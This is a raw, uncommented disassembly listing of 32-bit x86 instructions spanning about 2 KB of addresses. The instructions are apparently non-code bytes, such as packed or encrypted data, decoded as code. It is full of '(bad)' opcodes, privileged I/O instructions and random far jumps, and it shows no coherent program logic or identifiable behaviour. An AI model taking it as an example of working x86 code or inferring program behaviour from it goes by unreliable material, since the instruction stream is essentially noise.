  4061ea:	jmp    0xcda3:0xa89b24eb
  4061f1:	arpl   WORD PTR [ebp-0x1ad58f39],di
  4061f7:	mov    al,BYTE PTR [edi+0x11c324d5]
  4061fd:	mov    dl,0x2a
  4061ff:	shl    bh,cl
  406201:	inc    eax
  406202:	mov    eax,ebp
  406204:	inc    esi
  406205:	sbb    eax,0xe1b1f827
  40620a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40620b:	rcl    esp,1
  40620d:	sub    al,0x86
  40620f:	mov    bh,0x6f
  406211:	push   ebx
  406212:	sbb    BYTE PTR ds:[ebp+0xc],dl
  406216:	jns    0x406269
  406218:	pop    edi
  406219:	aaa    
  40621a:	popf   
  40621b:	dec    ebx
  40621c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40621d:	mov    ebx,0x4497fe3d
  406222:	pop    edi
  406223:	add    ebx,DWORD PTR [esi-0x2f6d7e6a]
  406229:	mov    dh,0xcf
  40622b:	mov    edx,0xf599e500
  406230:	fcmovnbe st,st(1)
  406232:	sbb    eax,DWORD PTR [edi-0x7ebc9125]
  406238:	and    ebp,DWORD PTR [esi]
  40623a:	pop    ebp
  40623b:	ror    BYTE PTR ds:0x49064ef8,cl
  406241:	pop    ebx
  406242:	cmp    al,0xe8
  406244:	mov    ah,0x4c
  406246:	or     bl,bl
  406248:	dec    edi
  406249:	sub    DWORD PTR [edi-0x7887c5a7],0x19048a71
  406253:	cmp    DWORD PTR ds:0x834c0d8c,esp
  406259:	pop    edi
  40625a:	gs aam 0xc6
  40625d:	addr16 leave 
  40625f:	xchg   ecx,eax
  406260:	dec    esi
  406261:	fnstenv [edi-0x7335f6a0]
  406267:	mov    eax,?
  406269:	pop    ds
  40626a:	(bad)  
  40626b:	inc    eax
  40626c:	test   BYTE PTR [eax],bh
  40626e:	mov    esp,0x2e5863eb
  406273:	iret   
  406274:	jbe    0x40626f
  406276:	out    dx,al
  406277:	or     ebp,edx
  406279:	or     eax,0x40d036f
  40627e:	cmp    eax,0x6f293c92
  406283:	sub    DWORD PTR [ecx],esp
  406285:	in     al,dx
  406286:	push   eax
  406287:	gs daa 
  406289:	lods   eax,DWORD PTR ds:[esi]
  40628a:	fld    QWORD PTR [eax]
  40628c:	xchg   esi,eax
  40628d:	lahf   
  40628e:	mov    eax,0x925f9d1d
  406293:	pop    es
  406294:	sbb    al,0xf0
  406296:	dec    ebx
  406297:	das    
  406298:	fistp  DWORD PTR [edi+0x5e3ba94b]
  40629e:	daa    
  40629f:	ja     0x4062f9
  4062a1:	aad    0xf1
  4062a3:	sbb    DWORD PTR [edx],edi
  4062a5:	jae    0x406250
  4062a7:	data16 adc cl,BYTE PTR [ebx-0x2e0b6868]
  4062ae:	loop   0x40631d
  4062b0:	mul    eax
  4062b2:	xchg   edi,eax
  4062b3:	pop    esp
  4062b4:	nop
  4062b5:	lods   eax,DWORD PTR ds:[esi]
  4062b6:	push   ecx
  4062b7:	(bad)  
  4062b8:	xor    al,0xd5
  4062ba:	arpl   WORD PTR [edi-0xd],si
  4062bd:	sbb    DWORD PTR [ebx+0x6c],esi
  4062c0:	push   es
  4062c1:	bound  edx,QWORD PTR [edi-0x47]
  4062c4:	inc    edx
  4062c5:	xchg   DWORD PTR [ebp-0x49],esp
  4062c8:	and    BYTE PTR [edx+0x371cd148],dh
  4062ce:	jge    0x40627a
  4062d0:	verw   sp
  4062d3:	nop
  4062d4:	mov    ah,0xf7
  4062d6:	xchg   esp,eax
  4062d7:	inc    esi
  4062d8:	loop   0x4062bb
  4062da:	dec    dx
  4062dc:	cli    
  4062dd:	call   0xed69:0x8fb146c5
  4062e4:	cmp    DWORD PTR [ecx+0x4f2c2642],eax
  4062ea:	loope  0x406276
  4062ec:	mov    al,ds:0xdec72cd5
  4062f1:	xchg   esi,eax
  4062f2:	pushf  
  4062f3:	jno    0x4062aa
  4062f5:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4062f7:	or     ebp,DWORD PTR [edi+0x72]
  4062fa:	inc    ebx
  4062fb:	ds jns 0x4062d3
  4062fe:	rep lods al,BYTE PTR ds:[esi]
  406300:	xor    BYTE PTR [edx+eax*2-0x11],0xa8
  406305:	icebp  
  406306:	(bad)  
  406307:	dec    eax
  406308:	adc    BYTE PTR [edi-0x32],0xcd
  40630c:	and    eax,0xef75ce96
  406311:	pop    eax
  406312:	pop    ebx
  406313:	cmp    bh,BYTE PTR [ebx-0x1b]
  406316:	xor    bl,0x4c
  406319:	scas   eax,DWORD PTR es:[edi]
  40631a:	or     ecx,DWORD PTR [edx]
  40631c:	into   
  40631d:	or     al,0x8e
  40631f:	fsubp  st(2),st
  406321:	adc    bh,BYTE PTR ds:0x50fbb227
  406327:	aad    0xae
  406329:	jl     0x40630f
  40632b:	add    al,0x53
  40632d:	test   BYTE PTR [esi],dl
  40632f:	jl     0x4062f9
  406331:	ins    DWORD PTR es:[edi],dx
  406332:	xchg   ebp,eax
  406333:	(bad)  
  406334:	shr    DWORD PTR [ecx-0x39],cl
  406337:	lea    ebp,[ebp+edx*1+0x49725f0c]
  40633e:	xor    edx,edx
  406340:	mov    al,ds:0x342a7688
  406345:	(bad)  
  406346:	aam    0xf
  406348:	fisubr DWORD PTR [ecx-0x4d061906]
  40634e:	mov    bl,cl
  406350:	push   0x84f475d
  406355:	mov    ds:0xe8137a8,al
  40635a:	scas   eax,DWORD PTR es:[edi]
  40635b:	cmc    
  40635c:	xchg   edi,eax
  40635d:	inc    ebx
  40635e:	dec    edx
  40635f:	sub    ebx,DWORD PTR [esi+eiz*8+0x26]
  406363:	or     DWORD PTR [edi],esi
  406365:	mov    DWORD PTR [ebp+0x6e],ecx
  406368:	pop    esi
  406369:	cmp    esp,edi
  40636b:	daa    
  40636c:	mov    dl,BYTE PTR [edi+0x46]
  40636f:	push   edx
  406370:	or     DWORD PTR [eax+0x56f52637],edx
  406376:	pause  
  406378:	ror    BYTE PTR [edi],0xf6
  40637b:	je     0x406317
  40637d:	sti    
  40637e:	out    0xa0,al
  406380:	mov    ds,esi
  406382:	scas   al,BYTE PTR es:[edi]
  406383:	dec    ecx
  406384:	push   ds
  406385:	xchg   ebp,eax
  406386:	push   0xf5e4f720
  40638b:	sbb    DWORD PTR [eax+0x625738ea],edx
  406391:	adc    eax,0xe956562
  406396:	jle    0x406405
  406398:	loop   0x40633b
  40639a:	cs stc 
  40639c:	lock sbb eax,0x94fc40f7
  4063a2:	cmp    DWORD PTR [ebp-0xf63b749],eax
  4063a8:	adc    DWORD PTR [ebp+ecx*1-0x63294070],ecx
  4063af:	ret    
  4063b0:	shr    DWORD PTR [edi],1
  4063b2:	jno    0x406383
  4063b4:	(bad)  
  4063b5:	icebp  
  4063b6:	sbb    ch,ah
  4063b8:	rol    BYTE PTR [ebp+0x2f],0x75
  4063bc:	dec    ebp
  4063bd:	pop    eax
  4063be:	mov    bh,0x3b
  4063c0:	sbb    edi,DWORD PTR [edi+0x5f0534eb]
  4063c6:	add    eax,0xf0841fb7
  4063cb:	leave  
  4063cc:	pop    ebx
  4063cd:	inc    esp
  4063ce:	xchg   ebp,eax
  4063cf:	nop
  4063d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063d1:	push   ecx
  4063d2:	and    eax,0x5608b6a9
  4063d7:	cmp    bl,BYTE PTR [ebx-0x6b488151]
  4063dd:	and    al,BYTE PTR [esi+0x3e06692e]
  4063e3:	fwait
  4063e4:	sub    bl,BYTE PTR [ebp-0x18]
  4063e7:	popa   
  4063e8:	mov    ecx,0xda889d2b
  4063ed:	or     DWORD PTR [ebx-0x843e1ca],ebx
  4063f3:	jno    0x4063e8
  4063f5:	mov    BYTE PTR [ecx+0x26006ab1],bl
  4063fb:	add    dh,al
  4063fd:	xchg   BYTE PTR [esi+esi*4+0x5aa57f69],dl
  406404:	xor    DWORD PTR [edx-0x5b14d2bc],0xffffffb6
  40640b:	pop    ss
  40640c:	adc    dl,BYTE PTR [ecx]
  40640e:	and    eax,0xa1fffdae
  406413:	lahf   
  406414:	cmc    
  406415:	out    dx,eax
  406416:	outs   dx,BYTE PTR ds:[esi]
  406417:	add    DWORD PTR ds:0xfd6d7114,ebp
  40641d:	xor    ebp,DWORD PTR ds:0x66cb6e5f
  406423:	sub    al,0x76
  406425:	adc    al,0x10
  406427:	push   esp
  406428:	rcl    BYTE PTR [edx],cl
  40642a:	imul   ecx,DWORD PTR [ecx],0x482e3b84
  406430:	add    ah,BYTE PTR [edx-0x65]
  406433:	mov    eax,0xbe5d5bcc
  406438:	xor    BYTE PTR [edx-0x67],ah
  40643b:	cmp    bh,BYTE PTR [ecx]
  40643d:	sbb    DWORD PTR [ecx-0x1468981c],esp
  406443:	dec    esi
  406444:	mov    al,0x52
  406446:	mov    al,0x17
  406448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406449:	aam    0x9a
  40644b:	imul   ebp,edx,0x50
  40644e:	sti    
  40644f:	pop    ss
  406450:	mov    bh,0xb8
  406452:	jne    0x406475
  406454:	xor    eax,0x7ace8b29
  406459:	cmpxchg BYTE PTR [esi],ch
  40645c:	(bad)  [ebp+0x22]
  40645f:	xor    dl,bh
  406461:	ins    DWORD PTR es:[edi],dx
  406462:	ror    ecx,0x80
  406465:	sti    
  406466:	lock (bad) 
  406468:	sar    BYTE PTR [ebx+0x5a],1
  40646b:	sti    
  40646c:	repz cmp ebp,esi
  40646f:	pusha  
  406470:	mov    eax,ds:0xc32410e9
  406475:	jns    0x4064b2
  406477:	jb     0x4064f0
  406479:	xchg   esp,eax
  40647a:	mov    dh,0x47
  40647c:	rcl    DWORD PTR [ecx+0x1e68da64],cl
  406482:	cmp    ah,bh
  406484:	or     ebx,DWORD PTR [ecx]
  406486:	dec    ecx
  406487:	ins    DWORD PTR es:[edi],dx
  406488:	mov    ch,BYTE PTR [ebp-0x2bed57c1]
  40648e:	pop    eax
  40648f:	(bad)  
  406490:	jo     0x406441
  406492:	int3   
  406493:	adc    al,0xd4
  406495:	cld    
  406496:	(bad)
  40649a:	pop    edi
  40649b:	inc    ecx
  40649c:	int3   
  40649d:	cmc    
  40649e:	nop
  40649f:	and    edi,DWORD PTR ds:0x11c24f10
  4064a5:	pop    ebp
  4064a6:	nop
  4064a7:	lds    ecx,FWORD PTR [esi-0x22]
  4064aa:	popa   
  4064ab:	cmp    eax,0x64e9c6c2
  4064b0:	icebp  
  4064b1:	adc    bl,BYTE PTR [eax+0x25]
  4064b4:	xchg   edi,eax
  4064b5:	in     al,dx
  4064b6:	cld    
  4064b7:	aas    
  4064b8:	retf   
  4064b9:	dec    edi
  4064ba:	dec    eax
  4064bb:	aaa    
  4064bc:	pop    esi
  4064bd:	cmp    esp,esp
  4064bf:	shrd   eax,ebx,0x93
  4064c3:	retf   
  4064c4:	fdivr  DWORD PTR [eax-0x57]
  4064c7:	adc    BYTE PTR [eax-0x54bedd44],bl
  4064cd:	inc    ecx
  4064ce:	fsubr  QWORD PTR [ebx-0x1b7775df]
  4064d4:	test   BYTE PTR [esi],0xc6
  4064d7:	sbb    al,0x17
  4064d9:	lds    esi,FWORD PTR [eax]
  4064db:	mov    edi,0xcb44a3
  4064e0:	inc    eax
  4064e1:	pop    esi
  4064e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e3:	or     BYTE PTR [eax-0x6],bl
  4064e6:	fbstp  TBYTE PTR [edx-0x28]
  4064e9:	fbld   TBYTE PTR [eax+0x7af1a565]
  4064ef:	adc    al,0xd4
  4064f1:	push   cs
  4064f2:	sbb    eax,0x5895a3c6
  4064f7:	push   esi
  4064f8:	sbb    BYTE PTR [ecx],ch
  4064fa:	sbb    eax,0x65a81b96
  4064ff:	(bad)  
  406500:	or     eax,0x3e391502
  406505:	dec    ebp
  406506:	fbld   TBYTE PTR [esi-0x44]
  406509:	retf   0x24c
  40650c:	push   es
  40650d:	cmp    eax,ebx
  40650f:	pop    cx
  406511:	bound  ebp,QWORD PTR [edx-0x3]
  406514:	or     edx,DWORD PTR [esi]
  406516:	cmc    
  406517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406518:	mov    esp,0x20d3c105
  40651d:	pop    ecx
  40651e:	ror    DWORD PTR [edi+0x52369435],1
  406524:	das    
  406525:	(bad)  [ebp+0x77]
  406528:	cmp    al,0xd0
  40652a:	pop    es
  40652b:	lock clc 
  40652d:	loope  0x4065ae
  40652f:	pop    ebp
  406530:	imul   edi,DWORD PTR [ebx],0x1c69e44c
  406536:	out    dx,eax
  406537:	adc    eax,0x87282f4
  40653c:	adc    eax,DWORD PTR [esi]
  40653e:	addr16 adc eax,0x50660358
  406544:	jg     0x406540
  406546:	add    BYTE PTR ds:0xebf908eb,dh
  40654c:	div    DWORD PTR [edx+0x2e100068]
  406552:	js     0x4065ba
  406554:	daa    
  406555:	mov    ds:0x4ad58e65,al
  40655a:	loope  0x4065a8
  40655c:	mov    WORD PTR [ebx+0xb],?
  40655f:	pop    edi
  406560:	jp     0x40656a
  406562:	repnz pop ds
  406564:	mov    ds:0x1bd10b3d,al
  406569:	xor    BYTE PTR [ecx-0x53],dl
  40656c:	ret    
  40656d:	cld    
  40656e:	(bad)  
  40656f:	dec    esp
  406570:	sahf   
  406571:	clc    
  406572:	fistp  WORD PTR es:[ecx-0x6e]
  406576:	enter  0x50b7,0x46
  40657a:	outs   dx,BYTE PTR ds:[esi]
  40657b:	jmp    0xca90479a
  406580:	or     dh,BYTE PTR [ebx-0x78]
  406583:	arpl   WORD PTR [ebp+0x43fc90ad],cx
  406589:	sub    ch,cl
  40658b:	mov    edx,0x9ec24695
  406590:	mov    edx,0x4c72838d
  406595:	fsub   st(3),st
  406597:	scas   eax,DWORD PTR es:[edi]
  406598:	cld    
  406599:	rol    al,0x4a
  40659c:	jmp    0x115ad210
  4065a1:	cs stos BYTE PTR es:[edi],al
  4065a3:	mov    BYTE PTR [eax],al
  4065a5:	add    esp,DWORD PTR [ecx]
  4065a7:	and    al,0xe8
  4065a9:	push   edi
  4065aa:	mov    edi,0x1fe08fa0
  4065af:	clc    
  4065b0:	mov    dl,0x48
  4065b2:	popf   
  4065b3:	mov    BYTE PTR [edi+0x57],ah
  4065b6:	add    ecx,DWORD PTR [ebp+esi*1-0xa]
  4065ba:	push   ss
  4065bb:	(bad)  
  4065bc:	mov    al,ds:0xe5bbea2c
  4065c1:	dec    edi
  4065c2:	lods   eax,DWORD PTR ds:[esi]
  4065c3:	mov    eax,DWORD PTR ds:0x32061473
  4065c9:	jecxz  0x406600
  4065cb:	jmp    0x837c2a6a
  4065d0:	je     0x406559
  4065d2:	in     eax,0x34
  4065d4:	mov    dl,BYTE PTR [ebx]
  4065d6:	loopne 0x4065a7
  4065d8:	sbb    eax,0x6f1aee88
  4065dd:	cmp    ebx,DWORD PTR [ebx]
  4065df:	in     eax,dx
  4065e0:	lea    eax,[eax]
  4065e2:	test   al,0x7b
  4065e4:	jg     0x40658e
  4065e6:	fs pop es
  4065e8:	mov    bh,0x30
  4065ea:	imul   edx,DWORD PTR [edx+0x2a],0xffffffa4
  4065ee:	sub    bh,BYTE PTR [ebx]
  4065f0:	cmp    esi,esp
  4065f2:	lock dec ecx
  4065f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f5:	add    BYTE PTR [eax-0x5011e2db],ch
  4065fb:	sbb    al,0x78
  4065fd:	pop    edx
  4065fe:	jmp    0x406624
  406600:	mov    dh,0xdd
  406602:	adc    DWORD PTR [ebx-0x7f375f17],ecx
  406608:	dec    eax
  406609:	xchg   ebx,eax
  40660a:	cmp    edx,DWORD PTR ds:0xe3dc6566
  406610:	test   BYTE PTR [edx-0x1a4eb4bd],ch
  406616:	pop    ebp
  406617:	pusha  
  406618:	cmp    BYTE PTR [esi-0x4e38ad1a],ch
  40661e:	aas    
  40661f:	cmp    al,0x45
  406621:	pushf  
  406622:	in     al,dx
  406623:	test   DWORD PTR [ebx+0x69814a75],eax
  406629:	jno    0x40666b
  40662b:	imul   edx,DWORD PTR [ebp+0x73],0x38e335dc
  406632:	scas   al,BYTE PTR es:[edi]
  406633:	push   0x976a337d
  406638:	dec    ebp
  406639:	push   0xffffffae
  40663b:	sbb    DWORD PTR [edi+0x450f9fdd],esp
  406641:	add    eax,0x6cef55b8
  406646:	outs   dx,DWORD PTR ds:[esi]
  406647:	mov    ah,0x1b
  406649:	mov    ebp,0xc2b26dc7
  40664e:	int    0x37
  406650:	jbe    0x4066c5
  406652:	adc    esp,DWORD PTR [esi]
  406654:	call   0xd738:0xc57bd872
  40665b:	shl    DWORD PTR [eax+0x66],0xd0
  40665f:	pop    ss
  406660:	pop    eax
  406661:	test   eax,0xa3eac8a7
  406666:	sahf   
  406667:	and    DWORD PTR [ecx-0x3e],edi
  40666a:	and    ebx,DWORD PTR [ecx-0x2b3bb58e]
  406670:	pop    eax
  406671:	fist   DWORD PTR [edx]
  406673:	pop    ecx
  406674:	and    ch,BYTE PTR [eax-0x3f]
  406677:	rcr    DWORD PTR [ecx-0x2c8e5321],1
  40667d:	inc    ebx
  40667e:	inc    ebx
  40667f:	xchg   esp,eax
  406680:	fwait
  406681:	xor    ecx,esi
  406683:	adc    ebp,DWORD PTR ds:0x72c8aed5
  406689:	dec    edi
  40668a:	push   ebp
  40668b:	pop    esp
  40668c:	xor    esp,DWORD PTR [edi]
  40668e:	adc    al,0x1a
  406690:	adc    eax,0x590cc4df
  406695:	cli    
  406696:	and    eax,0x3287d5a0
  40669b:	mov    ch,0xfd
  40669d:	mov    BYTE PTR [edi+0x66028581],ch
  4066a3:	int    0x9e
  4066a5:	mov    BYTE PTR [esi+0x23b82ab3],dh
  4066ab:	jno    0x4066f0
  4066ad:	xlat   BYTE PTR ds:[ebx]
  4066ae:	enter  0xc7a9,0x6b
  4066b2:	add    al,0xe
  4066b4:	cwde   
  4066b5:	sub    DWORD PTR [edx+ebx*2+0x7a],ebx
  4066b9:	cdq    
  4066ba:	and    eax,0xf5fa4cdd
  4066bf:	inc    esp
  4066c0:	cmp    eax,0xfc3a0b1f
  4066c5:	not    edi
  4066c7:	repz jmp 0x4066c7
  4066ca:	je     0x4066dc
  4066cc:	sbb    esp,ebx
  4066ce:	popf   
  4066cf:	jp     0x4066b1
  4066d1:	ja     0x4066ea
  4066d3:	pop    es
  4066d4:	xchg   si,ax
  4066d6:	add    bh,bl
  4066d8:	aaa    
  4066d9:	jg     0x4066df
  4066db:	push   edx
  4066dc:	push   0x4d
  4066de:	inc    ebp
  4066df:	jo     0x40668f
  4066e1:	jp     0x4066d5
  4066e3:	push   ecx
  4066e4:	shl    BYTE PTR [ebx+eiz*8-0x1e],0x39
  4066e9:	mov    dl,0xe3
  4066eb:	inc    esi
  4066ec:	ret    
  4066ed:	in     al,dx
  4066ee:	cmp    bh,BYTE PTR [esi-0x1c]
  4066f1:	sbb    ebx,eax
  4066f3:	call   0xa2fb37f4
  4066f8:	outs   dx,BYTE PTR ds:[esi]
  4066f9:	mov    ah,0x33
  4066fb:	dec    ebp
  4066fc:	xchg   ebp,eax
  4066fd:	add    ebx,DWORD PTR [esi+0xa466760]
  406703:	jb     0x4066e3
  406705:	push   edx
  406706:	bound  esi,QWORD PTR [ecx+edx*4+0x2835feb6]
  40670d:	xchg   DWORD PTR ds:[ebx-0x41cb1ee2],esp
  406714:	popa   
  406715:	pop    edx
  406716:	adc    eax,0xd0c9b1f7
  40671b:	push   ebx
  40671c:	xor    DWORD PTR [edx+0x4ed7c259],edi
  406722:	fld    TBYTE PTR [edi-0x44]
  406725:	call   0xd7b5:0x2346b7da
  40672c:	cmp    eax,0x38bdf2ba
  406731:	sub    BYTE PTR [edx-0x45],0xd0
  406735:	mov    ah,0x64
  406737:	into   
  406738:	dec    edi
  406739:	lea    ebx,ds:0xe2a49288
  40673f:	addr16 pop edi
  406741:	sti    
  406742:	out    dx,al
  406743:	mov    eax,0xac45247a
  406748:	daa    
  406749:	rcr    BYTE PTR [eax],cl
  40674b:	leave  
  40674c:	pushf  
  40674d:	es loope 0x4066ff
  406750:	in     al,0x4d
  406752:	jns    0x40670c
  406754:	mov    esi,0x52c04910
  406759:	(bad)  
  40675a:	pushf  
  40675b:	mov    esp,0x3affba84
  406760:	sbb    ebx,esi
  406762:	push   ebx
  406763:	icebp  
  406764:	pusha  
  406765:	int3   
  406766:	mov    ds:0x2721c10a,eax
  40676b:	push   es
  40676c:	scas   eax,DWORD PTR es:[edi]
  40676d:	mov    bl,0xe1
  40676f:	cmp    eax,DWORD PTR [eax+0x6f]
  406772:	add    BYTE PTR [ebp-0x54],cl
  406775:	(bad)  
  406776:	push   esi
  406777:	sbb    BYTE PTR [edi+ebp*2-0x6d1d8bac],al
  40677e:	pop    edx
  40677f:	jmp    0x76715111
  406784:	aad    0xf2
  406786:	cmp    BYTE PTR [edx+0x4a80f985],dl
  40678c:	inc    edi
  40678d:	shl    BYTE PTR [edx+eiz*4],1
  406790:	push   cs
  406791:	cld    
  406792:	fstp   DWORD PTR [edi+0x2c]
  406795:	and    al,BYTE PTR [ecx+ecx*4-0x2f459317]
  40679c:	fisttp DWORD PTR [edx+0x15a15272]
  4067a2:	mov    ds:0xca386ac4,al
  4067a7:	in     eax,dx
  4067a8:	ja     0x406828
  4067aa:	leave  
  4067ab:	ins    BYTE PTR es:[edi],dx
  4067ac:	xchg   BYTE PTR [ecx-0x1a552074],dh
  4067b2:	push   0x252fbc18
  4067b7:	test   DWORD PTR [edx],esi
  4067b9:	lea    ebp,[ecx]
  4067bb:	pop    esi
  4067bc:	call   0x6fa4f846
  4067c1:	adc    DWORD PTR [eax-0x7e6b577b],0xaf8dad7e
  4067cb:	mov    eax,ds:0xffd99eec
  4067d0:	idiv   BYTE PTR [edi+0x5a]
  4067d3:	jp     0x406848
  4067d5:	jnp    0x40680c
  4067d7:	or     al,0x3b
  4067d9:	nop
  4067da:	xor    DWORD PTR [edi],eax
  4067dc:	cld    
  4067dd:	ja     0x406799
  4067df:	push   ss
  4067e0:	dec    ebx
  4067e1:	fldcw  WORD PTR [ebx+0x53b890ad]
  4067e7:	repnz iret 
  4067e9:	retf   
  4067ea:	or     al,0x6e
  4067ec:	push   0x1183df09
  4067f1:	or     ebx,DWORD PTR [ecx+0x428c8dcf]
  4067f7:	rcl    DWORD PTR [esp+ecx*2-0x2b],0xf1
  4067fc:	pop    ecx
  4067fd:	and    DWORD PTR [edi],ebp
  4067ff:	mov    esi,0xe4e243ea
  406804:	aas    
  406805:	sub    al,0xe6
  406807:	in     eax,dx
  406808:	outs   dx,BYTE PTR ds:[esi]
  406809:	xor    esp,eax
  40680b:	(bad)  
  40680d:	xlat   BYTE PTR ds:[ebx]
  40680e:	push   edx
  40680f:	repnz sub ecx,esp
  406812:	jne    0x4067c3
  406814:	aas    
  406815:	pusha  
  406816:	mov    esp,0xb04cccdf
  40681b:	mov    es,WORD PTR [edi+0xb]
  40681e:	jmp    0x93ab:0xbce5d77
  406825:	sub    al,0xac
  406827:	pop    ds
  406828:	or     DWORD PTR [edx-0x6a],ebp
  40682b:	inc    esi
  40682c:	push   esp
  40682d:	mov    ch,0x2c
  40682f:	inc    eax
  406830:	mov    eax,ds:0xdfd753b9
  406835:	or     dl,BYTE PTR [ecx-0x3e]
  406838:	scas   al,BYTE PTR es:[edi]
  406839:	scas   al,BYTE PTR es:[edi]
  40683a:	mov    eax,0x5de8f37d
  40683f:	je     0x406863
  406841:	imul   ebx,DWORD PTR [esi],0x36088f04
  406847:	mov    eax,0xfce22057
  40684c:	ret    
  40684d:	adc    al,0x66
  40684f:	pushf  
  406850:	pop    esp
  406851:	and    edi,DWORD PTR [ecx+ebx*4-0x6e]
  406855:	xchg   esp,eax
  406856:	mov    ebx,cs
  406858:	sub    ecx,DWORD PTR [edi+esi*4-0x51]
  40685c:	popa   
  40685d:	int3   
  40685e:	mov    DWORD PTR [edx-0x53889489],0x5daab6d1
  406868:	pop    esi
  406869:	add    BYTE PTR [eax+edi*1],0xb9
  40686d:	(bad)  
  40686e:	mov    esi,0x99b913b
  406873:	bound  esp,QWORD PTR [esi-0x49c2d69a]
  406879:	rcr    BYTE PTR [edx],0x2f
  40687c:	pop    ecx
  40687d:	dec    ecx
  40687e:	mov    ds:0x967ac769,al
  406883:	bound  eax,QWORD PTR [ecx]
  406885:	imul   eax
  406887:	inc    edx
  406888:	jp     0x406845
  40688a:	lods   al,BYTE PTR ds:[esi]
  40688b:	mov    BYTE PTR [bp+di],cl
  40688e:	xor    DWORD PTR [ebp-0x9a302c2],esi
  406894:	pop    esp
  406895:	pop    ds
  406896:	ret    
  406897:	sbb    ecx,esi
  406899:	test   BYTE PTR [ecx],ah
  40689b:	nop
  40689c:	scas   eax,DWORD PTR es:[edi]
  40689d:	sub    al,BYTE PTR [ecx]
  40689f:	sub    edi,DWORD PTR [eax-0x75d98f01]
  4068a5:	and    bl,dh
  4068a7:	add    DWORD PTR [ecx+0x4c],ebx
  4068aa:	jle    0x406873
  4068ac:	pop    ss
  4068ad:	out    0x8f,eax
  4068af:	ficom  DWORD PTR [ebp+0x667ef846]
  4068b5:	(bad)  
  4068b6:	mov    al,ds:0xce4e6dea
  4068bb:	jno    0x4068c8
  4068bd:	dec    edx
  4068be:	sti    
  4068bf:	ret    0xedd2
  4068c2:	xchg   ebp,eax
  4068c3:	test   DWORD PTR [eax],esi
  4068c5:	pop    ebx
  4068c6:	ror    BYTE PTR [ecx-0x3c26f460],1
  4068cc:	jp     0x406933
  4068ce:	or     edi,DWORD PTR [ebx]
  4068d0:	xor    ecx,DWORD PTR [eax-0x1af395d6]
  4068d6:	in     al,dx
  4068d7:	scas   eax,DWORD PTR es:[edi]
  4068d8:	cmp    edi,0x7
  4068db:	or     al,0xce
  4068dd:	bound  ebx,QWORD PTR [esi+0x44207c66]
  4068e3:	ja     0x406957
  4068e5:	inc    ebx
  4068e6:	(bad)  
  4068e7:	cs adc al,0xa9
  4068ea:	dec    edi
  4068eb:	mov    ds:0x1e88d338,al
  4068f0:	xchg   BYTE PTR ds:0x21de1550,al
  4068f6:	jne    0x40688d
  4068f8:	xchg   esp,eax
  4068f9:	shr    ecx,1
  4068fb:	dec    edi
  4068fc:	sub    BYTE PTR [eax-0x15],dh
  4068ff:	push   edi
  406900:	repz jne 0x4068ab
  406903:	hlt    
  406904:	pop    ecx
  406905:	xor    eax,0x370a1b6c
  40690a:	mov    ebp,ebp
  40690c:	jmp    0x406988
  40690e:	int    0x6d
  406910:	in     al,dx
  406911:	lahf   
  406912:	pop    ecx
  406913:	mov    ecx,0xaa93e1b1
  406918:	mov    bl,0x39
  40691a:	lea    esi,[ecx+0x6c357668]
  406920:	mov    edi,0xed696e9b
  406925:	(bad)  
  406926:	lds    edx,FWORD PTR ds:0xc7bebd68
  40692c:	mov    ebp,0xcec2c4a6
  406931:	pop    es
  406932:	mov    eax,ds:0xabcaf86a
  406937:	jns    0x406970
  406939:	loopne 0x406900
  40693b:	xchg   edx,eax
  40693c:	add    BYTE PTR [esi-0x3406a2d],0x27
  406943:	jmp    0x50aa:0xbe6b775b
  40694a:	cmp    bh,BYTE PTR [ecx]
  40694c:	pop    es
  40694d:	sub    BYTE PTR [ebp+0x5f],dl
  406950:	add    BYTE PTR [ecx+ecx*1-0x143bfbf5],0x84
  406958:	jmp    0x1be38902
  40695d:	pop    edx
  40695e:	int    0xc2
  406960:	inc    edi
  406961:	lds    esi,FWORD PTR [ebx]
  406963:	xor    eax,0x7bc7487c
  406968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406969:	sar    DWORD PTR [ebx+0x10],1
  40696c:	push   0xffffff8f
  40696e:	sti    
  40696f:	fld    TBYTE PTR [esi-0x29]
  406972:	cmp    ecx,ebp
  406974:	xor    edx,DWORD PTR [eax+0x59356ffc]
  40697a:	cs iret 
  40697c:	pcmpgtd mm3,QWORD PTR [ebp+0x4b]
  406980:	push   ss
  406981:	mov    BYTE PTR [edi-0x57],cl
  406984:	test   DWORD PTR [edx-0x5944345f],edi
  40698a:	(bad)  
  40698d:	enter  0xe81b,0x7
  406991:	int    0x6f
  406993:	add    cl,BYTE PTR [ecx+0x67d7b1dd]
  406999:	stos   DWORD PTR es:[edi],eax
  40699a:	push   esi
  40699b:	sub    eax,0xba64bb37
  4069a0:	add    DWORD PTR [ecx+0xb7692f7],esi
  4069a6:	(bad)  
  4069a7:	pop    ebp
  4069a8:	jle    0x40694a
  4069aa:	adc    ebx,DWORD PTR [ebx+0x29]
  4069ad:	sbb    bl,BYTE PTR [edx-0x1d]
  4069b0:	into   
  4069b1:	push   esp
  4069b2:	(bad)  
  4069b4:	sbb    edx,DWORD PTR [edx+0x65]
  4069b7:	cmp    DWORD PTR [esi],ecx
  4069b9:	popf   
  4069ba:	pop    ebp
  4069bb:	mov    esi,0x67c15131
  4069c0:	nop
  4069c1:	ins    BYTE PTR es:[edi],dx
  4069c2:	pop    ebp
  4069c3:	push   esp
  4069c4:	daa    
  4069c5:	ds cdq 
  4069c7:	bound  edi,QWORD PTR [edx-0x56241cac]
  4069cd:	jg     0x406a4c
  4069cf:	les    edi,FWORD PTR [edx+0x1c]
  4069d2:	sbb    DWORD PTR [eax+edi*1],ecx
  4069d5:	jbe    0x406992
  4069d7:	aaa    
  4069d8:	std    
  4069d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069da:	mov    bh,0xe7
  4069dc:	sbb    DWORD PTR [edx+0x1c13b941],eax
  4069e2:	xor    dl,BYTE PTR [ebp+0x22]
  4069e5:	pop    DWORD PTR [ebx-0x67]
  4069e8:	pop    es
  4069e9:	mul    BYTE PTR ds:0x45fe5aa
  4069ef:	js     0x40698f
